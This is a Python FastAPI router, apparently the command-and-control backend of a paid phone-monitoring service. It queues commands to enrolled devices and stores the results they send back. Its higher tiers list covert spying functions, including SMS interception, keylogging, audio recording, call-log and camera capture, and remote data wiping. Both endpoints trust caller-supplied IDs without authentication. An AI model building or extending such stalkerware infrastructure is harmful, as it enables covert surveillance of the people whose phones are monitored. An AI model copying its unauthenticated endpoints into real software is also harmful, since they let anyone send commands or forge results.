from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from datetime import datetime
from app.database import get_db
from app.models.command import Command
from app.models.device import Device
from app.models.user import User
import json

router = APIRouter(prefix="/v1/commands", tags=["commands"])

TIER_COMMANDS = {
    "free": ["gps", "lock", "ring"],
    "pro": ["gps", "lock", "ring", "camera_front", "camera_back", "screenshot", "device_info", "wifi_scan"],
    "ultimate": ["gps", "lock", "ring", "camera_front", "camera_back", "screenshot", 
                 "device_info", "wifi_scan", "sms_intercept", "call_log", "keylog",
                 "audio_record", "app_list", "wipe_data"]
}

class SendCommandRequest(BaseModel):
    user_id: str
    device_id: str
    command_type: str
    command_data: str = "{}"

@router.post("/send")
async def send_command(request: SendCommandRequest, db: Session = Depends(get_db)):
    try:
        user = db.query(User).filter(User.id == request.user_id).first()
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        
        allowed = TIER_COMMANDS.get(user.tier, [])
        if request.command_type not in allowed:
            raise HTTPException(status_code=403, detail=f"Command requires higher tier")
        
        device = db.query(Device).filter(
            Device.id == request.device_id,
            Device.user_id == request.user_id
        ).first()
        if not device:
            raise HTTPException(status_code=404, detail="Device not found")
        
        # Parse command_data
        try:
            cmd_data = request.command_data if isinstance(request.command_data, str) else json.dumps(request.command_data)
        except:
            cmd_data = "{}"
        
        command = Command(
            device_id=device.id,
            command_type=request.command_type,
            command_data=cmd_data,
            status="pending"
        )
        
        db.add(command)
        db.commit()
        db.refresh(command)
        
        return {
            "command": command.to_dict(),
            "message": f"Command '{request.command_type}' queued"
        }
    except HTTPException:
        raise
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/result/{command_id}")
async def command_result(command_id: str, result: dict, db: Session = Depends(get_db)):
    command = db.query(Command).filter(Command.id == command_id).first()
    if not command:
        raise HTTPException(status_code=404, detail="Command not found")
    
    command.status = "executed"
    command.result = json.dumps(result) if isinstance(result, dict) else str(result)
    command.executed_at = datetime.utcnow()
    db.commit()
    
    return {"status": "ok"}
